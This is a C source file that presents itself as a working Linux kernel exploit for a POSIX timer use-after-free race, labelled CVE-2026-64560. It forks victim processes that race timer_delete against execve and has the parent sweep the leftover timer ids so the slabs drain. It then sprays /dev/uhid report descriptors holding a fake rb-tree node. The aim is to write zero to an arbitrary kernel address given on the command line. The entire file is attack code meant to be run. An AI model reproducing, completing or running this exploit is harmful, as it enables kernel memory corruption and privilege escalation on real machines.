/*
 * l63.c - CVE-2026-64560 landing, combining the two things that were mutually
 * exclusive until now.
 *
 * Established by measurement:
 *   - in-victim deleters hit the race (probe3: +84 persistent leak / 320 execs)
 *     but execve zaps them, so leftover timers pin their slabs and no page ever
 *     reaches the buddy allocator;
 *   - parent-owned deleters never hit, but they survive execve and complete.
 *   - NEW (freetest): a timer_delete() issued by the parent AFTER the victim's
 *     non-leader execve has completed still frees the k_itimer - 1000/1000
 *     deletes returned 0 and posix_timers_cache fell from 61 slabs to 30.
 *
 * So: the victim's own threads provide the race window, and the parent mops up
 * every remaining id afterwards (ids are published through a MAP_SHARED page that
 * survives the child's execve). Slabs then really drain, and the order-1 uhid
 * spray can take the page that holds the dangling timerqueue_node.
 *
 * Fake node, at both residues a node can occupy inside a 256-byte kmalloc-256
 * object (page offset 0xe0 + n*0x180 => 224 or 96 mod 256):
 *     node+0x00 __rb_parent_color = 0
 *     node+0x08 rb_right          = 0
 *     node+0x10 rb_left           = TARGET
 * which selects the "only left child" branch of __rb_erase_augmented: it writes
 * pc (0) to *(TARGET) and rb_next() returns NULL so rb_leftmost is not poisoned.
 *
 * usage: l63 <attempts> <timers/victim> <victims> <uhid_count> <drain_max_ms> <target>
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CLK_PROC_CPU   2
#define MAX_TIMERS     512
#define MAXVICTIM      32
#define MAXUHID        40000
#define NDEL           4

#define FAKE_AT_96     112
#define FAKE_AT_224    240
#define UHID_RD_SIZE   256
#define UHID_CREATE2   11
#define EVENT_SIZE     4380
#define CREATE2_OFF    4
#define BUS_USB        0x03

static unsigned long long g_target;
static int *g_shared;                  /* MAXVICTIM * MAX_TIMERS ids */
static volatile int *g_nids;           /* per-victim count */
static volatile int *g_go;             /* release exec */
static volatile int *g_delgo;          /* release the victim's deleters */

static void *exec_thread(void *arg)
{
    int idx = (int)(long)arg;
    while (!g_go[idx])
        sched_yield();
    char *const av[] = { (char *)"/proc/self/exe", (char *)"--child", NULL };
    char *const ep[] = { NULL };
    execve(av[0], av, ep);
    _exit(7);
}

struct delarg { int victim, widx, n; int *ids; };

static void *victim_deleter(void *arg)
{
    struct delarg *d = arg;
    while (!g_delgo[d->victim])
        sched_yield();
    for (int i = d->widx; i < d->n; i += NDEL)
        syscall(SYS_timer_delete, d->ids[i]);
    return NULL;
}

static int read_posix_slab(int *active, int *total)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    if (!f) return -1;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static long long now_ms(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

static unsigned char g_ev[EVENT_SIZE];
static unsigned char g_desc[UHID_RD_SIZE];
static int *g_fds;

static int uhid_create(int fd, int idx)
{
    memset(g_ev, 0, sizeof g_ev);
    *(uint32_t *)g_ev = UHID_CREATE2;
    unsigned char *c2 = g_ev + CREATE2_OFF;
    snprintf((char *)c2, 128, "lh63_%d", idx);
    *(uint16_t *)(c2 + 256) = UHID_RD_SIZE;
    *(uint16_t *)(c2 + 258) = BUS_USB;
    *(uint32_t *)(c2 + 260) = 0x1234;
    *(uint32_t *)(c2 + 264) = (uint32_t)idx;
    memcpy(c2 + 276, g_desc, UHID_RD_SIZE);
    return write(fd, g_ev, sizeof g_ev) == (ssize_t)sizeof g_ev ? 0 : -1;
}

static int uhid_spray(int n)
{
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (fd < 0) break;
        if (uhid_create(fd, i) != 0) { close(fd); break; }
        g_fds[made++] = fd;
    }
    return made;
}

static void victim_body(int idx, int ntimer)
{
    int *ids = g_shared + idx * MAX_TIMERS;
    signal(SIGUSR1, SIG_IGN);

    int made = 0;
    for (; made < ntimer; made++) {
        struct sigevent ev;
        struct itimerspec its;
        int id = -1;
        memset(&ev, 0, sizeof ev);
        ev.sigev_notify = SIGEV_SIGNAL;
        ev.sigev_signo = SIGUSR1;
        if (syscall(SYS_timer_create, CLK_PROC_CPU, &ev, &id) != 0) break;
        memset(&its, 0, sizeof its);
        its.it_value.tv_sec = 3600;
        if (syscall(SYS_timer_settime, id, 0, &its, NULL) != 0) break;
        ids[made] = id;
    }
    g_nids[idx] = made;
    if (made < 2) _exit(3);

    /* non-leader thread will run de_thread(); main thread only waits */
    pthread_t eth;
    pthread_create(&eth, NULL, exec_thread, (void *)(long)idx);

    pthread_t dth[NDEL];
    struct delarg da[NDEL];
    for (int i = 0; i < NDEL; i++) {
        da[i].victim = idx; da[i].widx = i; da[i].n = made; da[i].ids = ids;
        pthread_create(&dth[i], NULL, victim_deleter, &da[i]);
    }
    /* let the deleters enter their loops, then execve into the storm */
    sched_yield();
    g_delgo[idx] = 1;
    sched_yield();
    g_go[idx] = 1;

    for (;;) pause();
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--child")) {
        signal(SIGUSR1, SIG_IGN);
        usleep(20000 * 1000);         /* parent controls the exit via SIGKILL */
        _exit(0);
    }

    int attempts = argc > 1 ? atoi(argv[1]) : 200;
    int ntimer   = argc > 2 ? atoi(argv[2]) : 400;
    int nv       = argc > 3 ? atoi(argv[3]) : 8;
    int nuhid    = argc > 4 ? atoi(argv[4]) : 8000;
    int drain_ms = argc > 5 ? atoi(argv[5]) : 6000;
    if (argc > 6) g_target = strtoull(argv[6], NULL, 0);

    if (ntimer > MAX_TIMERS) ntimer = MAX_TIMERS;
    if (nv > MAXVICTIM) nv = MAXVICTIM;
    if (nuhid > MAXUHID) nuhid = MAXUHID;

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    size_t shm_sz = (size_t)MAXVICTIM * MAX_TIMERS * sizeof(int) + 4096;
    char *shm = mmap(NULL, shm_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shm == MAP_FAILED) { printf("mmap failed\n"); return 1; }
    g_shared = (int *)shm;
    g_nids   = (volatile int *)(shm + MAXVICTIM * MAX_TIMERS * sizeof(int));
    g_go     = (volatile int *)((char *)g_nids + 256);
    g_delgo  = (volatile int *)((char *)g_nids + 512);
    g_fds = calloc(MAXUHID, sizeof(int));

    memset(g_desc, 0, sizeof g_desc);
    memcpy(g_desc + FAKE_AT_96, &g_target, 8);
    memcpy(g_desc + FAKE_AT_224, &g_target, 8);

    printf("l63 target=%#llx attempts=%d timers=%d victims=%d uhid=%d drain=%dms\n",
           g_target, attempts, ntimer, nv, nuhid, drain_ms);
    printf("    victim-side race + parent-side sweep; fake node at obj+%d and obj+%d\n",
           FAKE_AT_96, FAKE_AT_224);
    fflush(stdout);

    for (int a = 1; a <= attempts; a++) {
        pid_t vpid[MAXVICTIM];
        for (int j = 0; j < MAXVICTIM; j++) vpid[j] = -1;
        for (int j = 0; j < nv; j++) { g_go[j] = 0; g_delgo[j] = 0; g_nids[j] = 0; }

        for (int j = 0; j < nv; j++) {
            pid_t v = fork();
            if (v == 0) victim_body(j, ntimer);
            vpid[j] = v;
        }

        usleep(150 * 1000);           /* victim storms + execve happen here */

        /* parent sweeps every id: leftovers from the zapped deleters are freed
         * here, which is what lets the slabs drain */
        int swept = 0;
        for (int j = 0; j < nv; j++) {
            int n = g_nids[j];
            int *ids = g_shared + j * MAX_TIMERS;
            for (int i = 0; i < n; i++)
                if (syscall(SYS_timer_delete, ids[i]) == 0) swept++;
        }

        long long t0 = now_ms();
        int drained = 0, act = -1, tot = -1;
        while (now_ms() - t0 < drain_ms) {
            if (read_posix_slab(&act, &tot) == 0 && (now_ms() - t0) >= 1200 && tot < 900) {
                drained = 1;
                break;
            }
            usleep(80000);
        }
        long long drain_used = now_ms() - t0;

        int made = uhid_spray(nuhid);

        for (int j = 0; j < nv; j++)
            if (vpid[j] > 0) kill(vpid[j], SIGKILL);
        usleep(250000);

        for (int i = 0; i < made; i++) close(g_fds[i]);

        printf("attempt=%d swept=%d drained=%d(%lldms) slab=%d/%d uhid=%d\n",
               a, swept, drained, drain_used, act, tot, made);
        fflush(stdout);
    }
    printf("DONE\n");
    return 0;
}
